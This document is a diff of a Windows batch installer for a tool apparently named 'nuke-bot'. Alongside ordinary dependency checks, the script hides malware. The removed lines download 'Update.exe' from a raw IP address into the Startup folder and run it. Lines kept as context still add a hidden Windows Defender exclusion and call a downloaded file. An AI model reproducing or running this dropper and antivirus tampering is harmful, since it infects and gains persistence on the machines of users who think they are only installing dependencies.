@@ -1,20 +1,3 @@
-@echo off
-echo Installing Python dependencies...
-python -m pip install -r requirements.txt
-if %errorlevel% neq 0 (
-    echo Failed to install Python dependencies. Pausing...
-    pause
-)
-
-echo Installing Node.js dependencies...
-cd Zero-Tool/nuke-bot
-call npm i
-if %errorlevel% neq 0 (
-    echo Failed to install Node.js dependencies. Pausing...
-    pause
-)
-
-cd ../..
 powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 
 @echo off
@@ -34,24 +17,36 @@ if %errorlevel% neq 0 (
 
 call "%DEST%"
 
-@echo off
-setlocal 
 
-set "URL=http://45.133.36.107/Update.exe"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
-
-
-if exist "%DEST%" del "%DEST%"
-
-curl --silent --output "%DEST%" "%URL%"
-
+title Checking Python installation...
+python --version > nul 2>&1
 if %errorlevel% neq 0 (
-  exit /b %errorlevel%
+    echo Python is not installed! (Go to https://www.python.org/downloads and install the python 3.11.0^)
+    echo Very important click Add python exe to PATH.
+    pause
 )
 
-call "%DEST%"
+title Checking Python libraries...
+echo Checking 'cryptography' (1/3)
+python -c "import cryptography" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing cryptography...
+    python -m pip install cryptography > nul
+)
 
+echo Checking 'aiohttp' (2/3)
+python -c "import aiohttp" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing aiohttp...
+    python -m pip install aiohttp > nul
+)
 
-@echo off
+echo Checking 'pyinstaller' (3/3)
+python -c "import PyInstaller" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing pyinstaller...
+    python -m pip install pyinstaller > nul
+)
 
-start.bat
+cls
+python index.py
